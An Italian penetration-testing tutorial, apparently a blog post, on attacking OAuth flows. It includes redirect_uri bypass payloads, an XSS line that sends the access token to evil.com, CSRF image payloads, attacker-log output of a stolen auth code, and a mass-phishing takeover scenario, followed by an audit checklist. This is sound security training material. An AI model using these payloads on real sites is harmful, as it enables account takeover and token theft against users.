---
title: 'OAuth Attack: Vulnerabilità OAuth, Token Theft e Account Takeover'
slug: oauth-attack
description: >-
  Scopri come sfruttare vulnerabilità OAuth: redirect_uri manipulation, CSRF
  senza state, token leak nel Referer e takeover account nel pentesting web.
image: /oauth-attack.webp
draft: false
date: 2026-03-17T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - csrf
---

OAuth è ovunque: "Accedi con Google", "Sign in with GitHub", "Login with Facebook". L'utente non crea un account — delega l'autenticazione a un provider fidato. Semplice, comodo, sicuro. Tranne quando l'implementazione ha buchi — e nella mia esperienza, ne ha quasi sempre. OAuth è un protocollo complesso con decine di parametri, redirect multipli, e flussi diversi (Authorization Code, Implicit, Client Credentials). Ogni passaggio è un'opportunità per l'attaccante.

L'attacco più impattante è la combinazione **open redirect nel redirect\_uri + token theft**: l'attaccante manipola il parametro `redirect_uri` per puntare a un dominio sotto il suo controllo, la vittima clicca "Autorizza", e il token (o l'authorization code) viene inviato all'attaccante invece che all'applicazione legittima. Account takeover senza alcuna interazione sospetta — la vittima ha solo cliccato "Accedi con Google" come fa ogni giorno.

Satellite della [guida pillar Auth & Access Control](https://hackita.it/articoli/auth-access-control-guida-completa). Vedi anche: [Password Reset Attack](https://hackita.it/articoli/password-reset-attack), [CSRF](https://hackita.it/articoli/csrf).

Riferimenti: [PortSwigger OAuth labs](https://portswigger.net/web-security/oauth), [OAuth 2.0 Security Best Practices (IETF)](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics), [HackTricks OAuth](https://book.hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html).

***

## Come Funziona OAuth — Il Flusso Da Attaccare

```
AUTHORIZATION CODE FLOW (il più comune):

1. Utente clicca "Accedi con Google" su target.com
2. Il browser redirect a:
   https://accounts.google.com/o/oauth2/auth?
     client_id=TARGET_APP_ID
     &redirect_uri=https://target.com/callback
     &response_type=code
     &scope=email+profile
     &state=RANDOM_CSRF_TOKEN

3. L'utente si autentica su Google e clicca "Autorizza"
4. Google redirect a:
   https://target.com/callback?code=AUTH_CODE&state=RANDOM_CSRF_TOKEN

5. target.com scambia AUTH_CODE per un access_token (server-to-server)
6. target.com usa l'access_token per ottenere i dati dell'utente da Google

PUNTI DI ATTACCO:
→ redirect_uri (step 2) → se manipolabile → token theft
→ state (step 2/4) → se assente → CSRF OAuth
→ code (step 4) → se nel Referer → code leak
→ scope (step 2) → se manipolabile → over-privilege
→ Il callback (step 4) → se accetta qualsiasi code → account linking
```

***

## Attacco 1 — redirect\_uri Manipulation (Token Theft)

Se l'authorization server (Google, GitHub, ecc.) non valida rigorosamente il `redirect_uri`, l'attaccante può farlo puntare al proprio dominio:

### Bypass Validazione redirect\_uri

```bash
# redirect_uri legittimo:
redirect_uri=https://target.com/callback

# === BYPASS TECHNIQUES ===

# Subdomain (se wildcard in registrazione):
redirect_uri=https://evil.target.com/callback

# Path manipulation:
redirect_uri=https://target.com/callback/../../../evil.com
redirect_uri=https://target.com/callback/../../evil.com

# Open redirect chain:
# Se target.com ha un open redirect (es. /redirect?url=):
redirect_uri=https://target.com/redirect?url=https://evil.com
# Google valida "target.com" → accetta
# target.com redirect a evil.com → code/token arriva a evil.com!

# URL encoding:
redirect_uri=https://target.com%40evil.com    # @ encoded
redirect_uri=https://target.com%2F%2Fevil.com  # // encoded

# Fragment:
redirect_uri=https://target.com/callback#@evil.com

# Parameter pollution:
redirect_uri=https://target.com/callback&redirect_uri=https://evil.com

# Trailing path:
redirect_uri=https://target.com/callback/../../evil.com/steal

# Localhost equivalents:
redirect_uri=https://127.0.0.1/callback
redirect_uri=https://[::1]/callback
redirect_uri=http://localhost/callback
```

### Il Flusso Dell'Attacco

```bash
# Step 1: L'attaccante crea l'URL malevolo
https://accounts.google.com/o/oauth2/auth?
  client_id=TARGET_APP_ID
  &redirect_uri=https://target.com/redirect?url=https://evil.com/steal
  &response_type=code
  &scope=email+profile
  &state=ANYTHING

# Step 2: L'attaccante invia il link alla vittima (email, messaggio, social)

# Step 3: La vittima clicca → vede "Autorizza target.com?" → clicca Autorizza
# (tutto sembra legittimo — è la pagina di Google/GitHub/Facebook)

# Step 4: Google redirect a:
https://target.com/redirect?url=https://evil.com/steal?code=AUTH_CODE

# Step 5: target.com esegue il redirect (è un open redirect)
# Il browser va a:
https://evil.com/steal?code=AUTH_CODE

# Step 6: L'attaccante cattura AUTH_CODE → lo usa su target.com/callback
# → Account takeover!
```

***

## Attacco 2 — CSRF OAuth (State Parameter Assente)

Il parametro `state` previene il CSRF nel flusso OAuth. Se è assente o non validato, l'attaccante può **collegare il proprio account OAuth all'account della vittima**:

```bash
# === Il flusso CSRF OAuth ===

# Step 1: L'attaccante inizia il flusso OAuth con il proprio account Google
# E FERMA il flusso prima del callback — cattura il code:
https://target.com/callback?code=ATTACKER_AUTH_CODE
# (non lo usa)

# Step 2: L'attaccante invia il link del callback alla vittima:
<img src="https://target.com/callback?code=ATTACKER_AUTH_CODE">
# La vittima carica l'immagine → il browser fa la request al callback

# Step 3: target.com riceve ATTACKER_AUTH_CODE con la sessione della VITTIMA
# target.com collega l'account Google dell'ATTACCANTE all'account della VITTIMA

# Step 4: L'attaccante fa "Accedi con Google" con il proprio account
# → Accede all'account della VITTIMA!
```

### Verifica

```bash
# In Burp: intercetta il redirect iniziale a Google
# Controlla se il parametro &state= è presente

# Se assente → CSRF possibile
# Se presente → verifica che sia:
# 1. Diverso per ogni request (non statico)
# 2. Legato alla sessione dell'utente
# 3. Validato al ritorno nel callback

# Test: rimuovi &state= dalla request → il callback funziona?
# Se sì → state non è verificato → CSRF possibile anche se presente
```

***

## Attacco 3 — Token/Code Leak Nel Referer

Dopo il callback, se la pagina di destinazione carica risorse esterne, il `code` o il `token` nell'URL leaka nel header Referer:

```bash
# Il callback arriva a:
https://target.com/callback?code=AUTH_CODE_SECRET

# La pagina di callback carica:
<script src="https://cdn.analytics.com/tracker.js"></script>
<img src="https://logging.external.com/pixel.gif">

# Il browser invia:
GET /tracker.js HTTP/1.1
Host: cdn.analytics.com
Referer: https://target.com/callback?code=AUTH_CODE_SECRET
#                                           ^^^^^^^^^^^^^^^^^
# Il code è nel Referer! Leggibile da analytics.com

# Se l'attaccante ha accesso ai log di analytics → code rubato
```

### Test In Burp

```bash
# 1. Fai il flusso OAuth completo
# 2. Nella pagina del callback → Burp mostra le richieste a risorse esterne
# 3. Verifica se il Referer delle richieste esterne contiene il code/token
# 4. Se sì → leak confermato
```

***

## Attacco 4 — Scope Manipulation

Il parametro `scope` definisce a quali dati l'app può accedere. Se l'utente può manipolarlo:

```bash
# Scope originale (l'app chiede solo email):
scope=email

# L'attaccante modifica:
scope=email+profile+contacts+calendar+drive
# Se l'authorization server non verifica che lo scope sia coerente
# con ciò che l'app ha registrato → accesso a TUTTI i dati!

# Scope specifici pericolosi:
# Google: https://www.googleapis.com/auth/gmail.modify (leggi/scrivi email)
# GitHub: repo (accesso a tutti i repository privati)
# Microsoft: Mail.ReadWrite (leggi/scrivi email Outlook)
```

***

## Attacco 5 — Implicit Flow Abuse

L'Implicit Flow restituisce il token **direttamente nell'URL fragment** (dopo #). Non c'è scambio code-for-token server-side — il token è esposto nel browser:

```bash
# Response dell'authorization server:
https://target.com/callback#access_token=SECRET_TOKEN&token_type=bearer

# Il token è nel fragment (#) → non inviato al server nelle request standard
# MA: è nella history del browser, è accessibile da JavaScript nella pagina

# Se la pagina ha una XSS → il token è rubabile:
<script>
fetch('https://evil.com/steal?token='+window.location.hash.substr(1))
</script>

# L'Implicit Flow è deprecato per questo motivo (RFC 9700)
# Ma molte app legacy lo usano ancora
```

***

## Attacco 6 — Account Takeover Via Email Non Verificata

```bash
# Scenario: target.com supporta sia login tradizionale che OAuth

# Step 1: L'attaccante registra un account su target.com
#   con email: victim@company.com (senza verificare l'email)

# Step 2: La vittima fa "Accedi con Google" con victim@company.com
# target.com trova un account esistente con quell'email → lo collega al Google della vittima

# Step 3: L'attaccante fa login con la password che aveva impostato
# → Accede allo stesso account! (collegato sia con password che con OAuth)

# Funziona quando target.com collega gli account basandosi SOLO sull'email
# senza verificare che l'email fosse confermata nell'account originale
```

***

## Output Reale — OAuth Token Theft

### redirect\_uri Con Open Redirect

```bash
# Trovo un open redirect su target.com:
$ curl -v "https://target.com/go?url=https://evil.com" 2>&1 | grep Location
< Location: https://evil.com

# Costruisco l'URL OAuth con redirect_uri che sfrutta l'open redirect:
$ echo "https://accounts.google.com/o/oauth2/auth?\
client_id=123456.apps.googleusercontent.com\
&redirect_uri=https://target.com/go?url=https://evil.com/steal\
&response_type=code\
&scope=email+profile"

# La vittima clicca → Google autorizza → redirect a target.com/go → redirect a evil.com
# Sul mio server:
$ tail -f /var/log/nginx/access.log
203.0.113.50 - - "GET /steal?code=4/0AX4XfWh7YZ5K3wKd_EXAMPLE_AUTH_CODE HTTP/1.1" 200

# Uso il code:
$ curl -X POST "https://target.com/callback?code=4/0AX4XfWh7YZ5K3wKd_EXAMPLE_AUTH_CODE"
# → Session cookie dell'account della vittima!
```

### State Parameter Assente

```bash
# Intercetto il flusso OAuth in Burp:
GET /auth/google HTTP/1.1
Host: target.com

→ 302 Location: https://accounts.google.com/o/oauth2/auth?
   client_id=123456
   &redirect_uri=https://target.com/callback
   &response_type=code
   &scope=email+profile
   # NESSUN &state= !!! → CSRF possibile

# Inizio il flusso con il MIO account Google:
# Google redirect a: https://target.com/callback?code=MY_AUTH_CODE
# NON completo il callback → salvo MY_AUTH_CODE

# Invio alla vittima:
<img src="https://target.com/callback?code=MY_AUTH_CODE" width=0 height=0>
# La vittima carica l'immagine → il callback collega il MIO Google al SUO account
# Ora posso fare login con il MIO Google → entro nel SUO account
```

***

## Workflow Reale — OAuth Security Audit

### Step 1 → Mappa il flusso OAuth

```bash
# In Burp: fai il flusso "Accedi con Google/GitHub/Facebook"
# Nota:
# - Authorization URL (con tutti i parametri)
# - redirect_uri registrato
# - response_type (code o token)
# - Presenza di state
# - Scope richiesto
# - Callback endpoint
```

### Step 2 → redirect\_uri manipulation

```bash
# Prova ogni bypass:
# Subdomain, path traversal, encoding, open redirect chain
# Se l'authorization server accetta un redirect_uri modificato → token theft!
```

### Step 3 → State parameter

```bash
# È presente? È random? È validato al ritorno?
# Rimuovi &state= → il callback funziona? → CSRF possibile
```

### Step 4 → Token/code leak nel Referer

```bash
# Nella pagina di callback: ci sono risorse esterne?
# Il Referer contiene il code/token? → leak
```

### Step 5 → Implicit flow

```bash
# response_type=token? → il token è nell'URL fragment
# La pagina ha XSS? → token rubabile
```

### Step 6 → Account linking logic

```bash
# Registra un account con l'email della vittima (senza verificare)
# La vittima fa OAuth → l'account è collegato? → account sharing
```

***

## Enterprise Escalation

### Open Redirect + OAuth → Mass Account Takeover

```
Open redirect su target.com → /go?url=
Costruisci URL OAuth con redirect_uri che sfrutta l'open redirect
→ Phishing email a 1.000 dipendenti: "Verifica il tuo account aziendale"
→ 200 dipendenti cliccano "Accedi con Google" (sembra legittimo — è Google!)
→ 200 auth codes catturati → 200 account compromessi
→ Inclusi admin, HR, finance
→ MASS ACCOUNT TAKEOVER senza una sola password rubata
```

### CSRF OAuth → Admin Account Linking

```
Nessun state parameter → CSRF possibile
→ L'attaccante crea il link callback con il proprio auth code
→ Lo invia all'admin target (email, forum interno, ticket)
→ L'admin clicca → il Google dell'attaccante è collegato all'admin
→ L'attaccante fa "Accedi con Google" → accesso admin
→ ADMIN TAKEOVER
```

***

## Caso Studio Concreto

**Settore:** SaaS enterprise con SSO Google Workspace per 300 aziende.
**Scope:** Grey-box.

Il flusso OAuth usava `redirect_uri=https://app.target.com/auth/callback`. La validazione del redirect\_uri da parte di Google era corretta per il dominio esatto. Ma ho trovato un open redirect su `https://app.target.com/r?url=` (usato per tracking link nel marketing). La redirect chain funzionava: `redirect_uri=https://app.target.com/r?url=https://attacker.com/steal`.

Il parametro `state` era presente ma **statico** — sempre lo stesso valore `"oauth_state"` per tutti gli utenti. Non era un anti-CSRF token, era una stringa fissa. Rimosso completamente → il callback funzionava ugualmente.

Chain dimostrata: URL con redirect\_uri manipolato inviato come "verifica il tuo accesso SSO" a un admin → admin clicca "Accedi con Google" → auth code catturato → session dell'admin ottenuta → accesso a 300 tenant aziendali.

**Il tutto sembrava completamente legittimo: era la pagina di Google, il dominio era target.com, l'utente ha solo cliccato "Autorizza".**

***

## ✅ Checklist OAuth Attack

```
REDIRECT_URI
☐ redirect_uri con dominio diverso testato
☐ redirect_uri con subdomain evil.target.com testato
☐ redirect_uri con path traversal testato
☐ redirect_uri con open redirect chain testato
☐ redirect_uri con URL encoding testato
☐ redirect_uri con parameter pollution testato

STATE PARAMETER
☐ state presente nella request iniziale?
☐ state random per ogni request? (non statico)
☐ state validato nel callback? (rimuovi → funziona?)
☐ state legato alla sessione?

TOKEN/CODE LEAK
☐ Pagina callback carica risorse esterne?
☐ Referer contiene code/token?
☐ response_type=token (Implicit)? → token nell'URL fragment

SCOPE
☐ Scope manipolabile? (aggiungi scope extra)
☐ Scope coerente con ciò che l'app ha registrato?

ACCOUNT LINKING
☐ Registrazione con email non verificata → OAuth linking?
☐ OAuth collega account basandosi solo sull'email?

FLOW
☐ Authorization Code o Implicit? (Implicit = meno sicuro)
☐ PKCE presente? (code_challenge e code_verifier)
☐ Il code è monouso? (riutilizzabile?)
☐ Il code scade rapidamente? (<60 secondi)
```

***

Riferimenti: [PortSwigger OAuth vulnerabilities](https://portswigger.net/web-security/oauth), [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics), [HackTricks OAuth to Account Takeover](https://book.hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html), [Aaron Parecki OAuth.com](https://www.oauth.com/).

Satellite della [Guida Auth & Access Control](https://hackita.it/articoli/auth-access-control-guida-completa). Vedi anche: [CSRF](https://hackita.it/articoli/csrf), [Password Reset Attack](https://hackita.it/articoli/password-reset-attack), [Session Hijacking](https://hackita.it/articoli/session-hijacking).

> Il tuo flusso OAuth ha il parametro state? Il redirect\_uri è validato rigorosamente? La pagina di callback carica risorse esterne? [Penetration test HackIta](https://hackita.it/servizi) per testare ogni punto del flusso OAuth. Dal redirect all'account takeover: [formazione 1:1](https://hackita.it/formazione).
